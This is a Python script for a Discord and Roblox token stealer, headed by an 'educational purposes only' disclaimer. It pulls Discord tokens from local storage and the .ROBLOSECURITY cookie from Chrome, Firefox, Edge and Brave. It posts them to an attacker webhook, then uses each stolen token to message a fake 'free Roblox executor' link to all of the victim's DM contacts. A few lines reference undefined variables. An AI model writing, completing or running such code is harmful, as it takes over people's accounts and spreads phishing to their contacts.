import os
import json
import base64
import requests
import browser_cookie3

"""
DISCLAIMER:

The code provided in this software is intended for educational purposes only. The use of this software to access or interfere with someone else's Discord account, steal personal information, or engage in any unauthorized activities is strictly prohibited and illegal. The creator of this software does not condone any form of hacking, exploitation, or malicious activity.
By using this software, you agree that you will not use it for any illegal or unethical purposes, including but not limited to phishing, token theft, unauthorized access to accounts, and spamming. The creator of this software is not responsible for any actions taken using this tool and will not be held liable for any consequences arising from its use.
If you are unsure about the legality of using this software, please refrain from using it and seek legal advice.

"""

webhook_url = "https://discord.com/api/webhooks/EXAMPLE/WEBHOOK"
message = "Hey! Check out this new free Roblox executor: https://fake-link.com"

def send_webhook_message(roblosec):
    if not roblosec:
        return

    data = {
        "username": "Extracted .roblosecurity token",
        "content": f"```{roblo}```"
    }
    requests.post(webhook_url, json=data)

def find_roblosecurity():
    browsers = [browser_cookie3.chrome, browser_cookie3.firefox, browser_cookie3.edge, browser_cookie3.brave]
    
    for browser in browsers:
        try:
            cookies = browser(domain=".roblox.com")
            for cookie in cookies:
                if cookie.name == ".ROBLOSECURITY":
                    return cookie.value
        except Exception as e:
            pass
    
    return None
  
discord_paths = [
    os.path.expandvars(r"%APPDATA%\Discord\Local Storage\leveldb"),
    os.path.expandvars(r"%APPDATA%\DiscordCanary\Local Storage\leveldb"),
    os.path.expandvars(r"%APPDATA%\DiscordPTB\Local Storage\leveldb"),
]

def get_tokens():
    tokens = []
    for path in discord_paths:
        if not os.path.exists(path):
            continue
        for file_name in os.listdir(path):
            if file_name.endswith(".ldb") or file_name.endswith(".log"):
                with open(os.path.join(path, file_name), "r", errors="ignore") as file:
                    for line in file.readlines():
                        if "mfa." in line or len(line) > 59:
                            tokens.append(line.strip())
    return tokens

def send_tokens(tokens):
    if not tokens:
        return

    data = {
        "username": "Token Logger",
        "content": f"Stolen Tokens:\n" + "\n".join(tokens)
    }
    requests.post(webhook_url, json=data)

def send_spam_message(token):
    headers = {"Authorization": token}

    dm_response = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers)
    
    if dm_response.status_code == 200:
        dms = dm_response.json()
        for dm in dms:
            requests.post(f"https://discord.com/api/v9/channels/{dm['id']}/messages",
                          headers=headers, json={"content": message})

def main():
    stolen_tokens = get_tokens()

    send_tokens(stolen_tokens)

    for token in stolen_tokens:
        send_spam_message(token)

    roblosecurity_token = find_roblosecurity()
    send_webhook_message(cookie.value)

if __name__ == "__main__":
    main()
